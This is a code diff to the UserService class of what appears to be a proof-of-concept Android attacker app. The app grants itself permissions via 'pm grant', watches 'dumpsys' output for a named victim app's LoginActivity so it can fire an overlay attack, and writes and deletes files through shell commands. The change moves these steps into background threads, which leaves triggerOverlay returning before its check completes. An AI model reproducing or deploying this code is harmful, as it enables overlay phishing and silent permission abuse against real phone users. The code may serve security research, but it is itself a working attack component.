@@ -1,10 +1,6 @@
 package com.example.attackerappjava;
 
-import android.app.Service;
 import android.content.Context;
-import android.content.Intent;
-import android.os.IBinder;
-import android.os.RemoteException;
 import android.util.Log;
 
 import androidx.annotation.Keep;
@@ -12,8 +8,8 @@ import androidx.annotation.Keep;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
-import java.util.Collections;
-import java.util.List;
+import java.util.Objects;
+import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -29,10 +25,11 @@ public class UserService extends IUserService.Stub {
 
     private static final String TAG = "UserService";
 
-        @Override
-        public void gatherPermission(String permission) {
-            String pkg = "com.example.attackerappjava";
-            Log.d(TAG, "Executing command: sh -c pm grant com.example.attackerappjava android.permission." + permission);
+    @Override
+    public void gatherPermission(String permission) {
+        String pkg = "com.example.attackerappjava";
+        Log.d(TAG, "Executing command: sh -c pm grant com.example.attackerappjava android.permission." + permission);
+        new Thread(() -> {
             ArrayList<String> output = new ArrayList<>();
             Process process = null;
 
@@ -41,7 +38,7 @@ public class UserService extends IUserService.Stub {
                 return;
             }
             try {
-                process = new ProcessBuilder("pm","grant",pkg,"android.permission." + permission).start();
+                process = new ProcessBuilder("pm", "grant", pkg, "android.permission." + permission).start();
                 int exitCode = process.waitFor();
                 Log.d(TAG, "Command exited with code: " + exitCode);
 
@@ -56,25 +53,29 @@ public class UserService extends IUserService.Stub {
                     process.destroy();
                 }
             }
-        }
-        
-        public boolean triggerOverlay(){
-            Log.d(TAG,"Running...");
+        }).start();
+    }
+
+    public boolean triggerOverlay() {
+        Log.d(TAG, "Running...");
+        AtomicBoolean flag = new AtomicBoolean(false);
+        new Thread(() -> {
             Process process = null;
             BufferedReader reader = null;
             Pattern pattern = Pattern.compile("topResumedActivity=ActivityRecord\\{.*? (\\S+)/(\\S+) t\\d+\\}");
-            try{
-                process = new ProcessBuilder("dumpsys","activity","activities").start();
+            try {
+                process = new ProcessBuilder("dumpsys", "activity", "activities").start();
                 reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                 String line;
                 while ((line = reader.readLine()) != null) {
                     Matcher matcher = pattern.matcher(line);
-                    if(matcher.find()){
-                        Log.d(TAG,matcher.group(1));
-                        Log.d(TAG,matcher.group(2));
-                        if(matcher.group(1).equals("com.aheaditec.talsec.demoapp") && matcher.group().equals(".LoginActivity")){
-                            Log.d(TAG,"The trigger overlay should be triggered now...");
-                            return true;
+                    if (matcher.find()) {
+                        Log.d(TAG, matcher.group(1));
+                        Log.d(TAG, matcher.group(2));
+                        if (Objects.equals(matcher.group(1), "com.aheaditec.talsec.demoapp") && Objects.equals(matcher.group(2), ".LoginActivity")) {
+                            Log.d(TAG, "The trigger overlay should be triggered now...");
+                            flag.set(true);
+                            break;
                         }
                     }
                 }
@@ -86,26 +87,40 @@ public class UserService extends IUserService.Stub {
                 reader.close();
                 int exitCode = process.waitFor();
                 Log.d(TAG, "Command exited with code: " + exitCode);
-            }catch (Exception err){
+            } catch (Exception err) {
                 Log.e(TAG, "Failed to execute command!!", err);
             } finally {
                 if (process != null) {
                     process.destroy();
                 }
             }
-            Log.d(TAG,"The triggerable victim activity is not found...");
-            return false;
-        }
+            Log.d(TAG, "The triggerable victim activity is not found...");
+        }).start();
+        return flag.get();
+    }
 
-        public void writeToFile(String fileName,String content){
-            Log.d(TAG,"Writing to file...");
+    public void writeToFile(String fileName, String content) {
+        Log.d(TAG, "Writing to file...");
+        new Thread(()-> {
             Process process = null;
             BufferedReader reader = null;
-            try{
-                process = new ProcessBuilder("echo "+content+" >> "+fileName).start();
+            try {
+                process = new ProcessBuilder("echo ", content, " >> ", fileName).start();
                 int exitCode = process.waitFor();
                 Log.d(TAG, "Command exited with code: " + exitCode);
-            }catch (Exception ignored){
+            } catch (Exception ignored) {
             }
+        }).start();
+    }
+
+    public void deleteFile(String filePath) {
+        Process process = null;
+        BufferedReader reader = null;
+        try {
+            process = new ProcessBuilder("rm", filePath).start();
+            int exitCode = process.waitFor();
+            Log.d(TAG, "Command exited with code: " + exitCode);
+        } catch (Exception ignored) {
         }
+    }
 }
